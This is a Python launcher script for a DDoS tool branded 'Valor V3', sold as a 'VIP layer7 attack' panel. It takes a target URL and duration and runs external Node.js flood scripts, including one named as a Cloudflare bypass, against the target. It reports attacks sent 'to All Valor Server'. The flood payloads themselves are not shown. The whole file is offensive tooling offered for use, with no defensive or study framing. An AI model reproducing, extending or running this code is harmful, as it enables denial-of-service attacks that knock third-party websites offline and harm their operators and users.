from os import system, name
import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
import colorama
from colorama import Fore, init
from pystyle import *
import pystyle

w = Fore.WHITE

colorama.init()
def attack():
    stdout.write("> Methods: ")
    methodss = input()
    stdout.write("> Url:")
    target = input()
    stdout.write("> Port:")
    thread = input()
    stdout.write("> Duration: ")
    t = input()
    return methodss, target, thread, t

def layer7():
    os.system("cls")
    print("\x1b[38;5;190mVALOR III IS THE BEST POWE\x1b[38;5;207mRFUL VIP LAYER7 ATTACK")
    print("""
\x1b[38;5;207m[\x1b[38;5;255mTLS-STRONG\x1b[38;5;207m] \x1b[38;5;207m[\x1b[38;5;255mURL\x1b[38;5;207m] \x1b[38;5;207m[\x1b[38;5;255mDURATION\x1b[38;5;207m] \x1b[38;5;207m[\x1b[38;5;255mPORT\x1b[38;5;207m]
\x1b[38;5;207m[\x1b[38;5;255mHTTPS-RAW\x1b[38;5;207m]  \x1b[38;5;207m[\x1b[38;5;255mURL\x1b[38;5;207m] \x1b[38;5;207m[\x1b[38;5;255mDURATION\x1b[38;5;207m] \x1b[38;5;207m[\x1b[38;5;255mPORT\x1b[38;5;207m]
\x1b[38;5;207m[\x1b[38;5;255mBROWSER\x1b[38;5;207m]    \x1b[38;5;207m[\x1b[38;5;255mURL\x1b[38;5;207m] \x1b[38;5;207m[\x1b[38;5;255mDURATION\x1b[38;5;207m] \x1b[38;5;207m[\x1b[38;5;255mPORT\x1b[38;5;207m]
\x1b[38;5;207m[\x1b[38;5;255mCLOUDFLARE\x1b[38;5;207m] \x1b[38;5;207m[\x1b[38;5;255mURL\x1b[38;5;207m] \x1b[38;5;207m[\x1b[38;5;255mDURATION\x1b[38;5;207m] \x1b[38;5;207m[\x1b[38;5;255mPORT\x1b[38;5;207m]
""")

def help():
    os.system("cls")
    print(f"""
	                            \x1b[38;5;190m╦  ╦╔═╗╦  \x1b[38;5;207m╔═╗╦═╗  ╦╦╦
	                            \x1b[38;5;190m╚╗╔╝╠═╣║  \x1b[38;5;207m║ ║╠╦╝  ║║║
	                            \x1b[38;5;190m ╚╝ ╩ ╩╩═╝\x1b[38;5;207m╚═╝╩╚═  ╩╩╩
                           \x1b[38;5;190m ╚══╦═══════════════\x1b[38;5;207m════════════════╦══╝
                        \x1b[38;5;190m ╚╔════╩═══════════[Val\x1b[38;5;207mor]═════════════╩════╗╝
                        \x1b[38;5;190m ╚║      Welcome To Val\x1b[38;5;190m\x1b[38;5;207mor V3 Software       ║╝
                        \x1b[38;5;190m ╚╚════╦═══════════[Val\x1b[38;5;207mor]═════════════╦════╝╝
                        \x1b[38;5;190m       ╚╦══════════════\x1b[38;5;207m═══════════════╦╝            
                        \x1b[38;5;190m        ║ {w}-\x1b[38;5;10m[ADMIN: TQV X HY X MUXHU]{w}-\x1b[38;5;207m ║                                
                        \x1b[38;5;190m╚╔══════╩══════════════\x1b[38;5;207m═══════════════╩══════╗╝
                        \x1b[38;5;190m╚║        POWERED BY : \x1b[38;5;10mVALOR VERSION 3  \x1b[38;5;207m     ║╝
                        \x1b[38;5;190m╚║           METHODS :\x1b[38;5;10m POWERFUL BYPASSES\x1b[38;5;207m     ║╝
                        \x1b[38;5;190m╚║           TOOLS   :\x1b[38;5;10m OTHER TOOL\x1b[38;5;207m            ║╝
                        \x1b[38;5;190m╚╚═════════════════════\x1b[38;5;207m══════════════════════╝
""")


def menu():
    os.system("cls")
    os.system(f'cls & mode 95,35 & title [Muxhu] $Methods Page - Connected: Muxhu')
    print(f"""
	                            \x1b[38;5;190m╦  ╦╔═╗╦  \x1b[38;5;207m╔═╗╦═╗  ╦╦╦
	                            \x1b[38;5;190m╚╗╔╝╠═╣║  \x1b[38;5;207m║ ║╠╦╝  ║║║
	                            \x1b[38;5;190m ╚╝ ╩ ╩╩═╝\x1b[38;5;207m╚═╝╩╚═  ╩╩╩
                           \x1b[38;5;190m ╚══╦═══════════════\x1b[38;5;207m════════════════╦══╝
                        \x1b[38;5;190m ╚╔════╩═══════════[Val\x1b[38;5;207mor]═════════════╩════╗╝
                        \x1b[38;5;190m ╚║      Welcome To Val\x1b[38;5;190m\x1b[38;5;207mor V3 Software       ║╝
                        \x1b[38;5;190m ╚╚════╦═══════════[Val\x1b[38;5;207mor]═════════════╦════╝╝
                        \x1b[38;5;190m       ╚╦══════════════\x1b[38;5;207m═══════════════╦╝            
                        \x1b[38;5;190m        ║ {w}---\x1b[38;5;10m[ADMIN: Muxhu X NGT]{w}---\x1b[38;5;207m  ║                                
                        \x1b[38;5;190m╚╔══════╩══════════════\x1b[38;5;207m═══════════════╩══════╗╝
                        \x1b[38;5;190m╚║        POWERED BY  : \x1b[38;5;10mVALOR VERSION 3  \x1b[38;5;207m    ║╝
                        \x1b[38;5;190m╚║              Usage : \x1b[38;5;10mHELP  \x1b[38;5;207m               ║╝
                        \x1b[38;5;190m╚╚═════════════════════\x1b[38;5;207m══════════════════════╝╝
""")

def main():
    menu()
    while (True):
        cnc = input(f"""\x1b[38;5;255m[\x1b[38;5;190mVALOR III@\x1b[38;5;207mmuxhu\x1b[38;5;255m]~> \x1b[38;5;255m""")
        if cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "HELP" or cnc == "help":
            help()
        elif cnc == "methods" or cnc == "METHODS" or cnc == "me" or cnc == "ME":
            layer7()
        elif "http-raw" in cnc:
            try:

                url = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                print(f"""\x1b[38;5;190mAttack Sent Succes\x1b[38;5;207mfully to All Valor Server""")
                os.system(f"node ./methods/ok.js {url} {time}")
            except:
                print(f"Usage : http-raw <url> <time> <port>")

        elif "cloudflare" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                port = cnc.split()[3]
                print(f"""\x1b[38;5;190mAttack Sent Succes\x1b[38;5;207mfully to All Valor Server""")

                os.system(f"node ./methods/CFBypass2.js {url} {time}")
            except:
                print(f"Usage : cloudflare <url> <time> <port>")
main()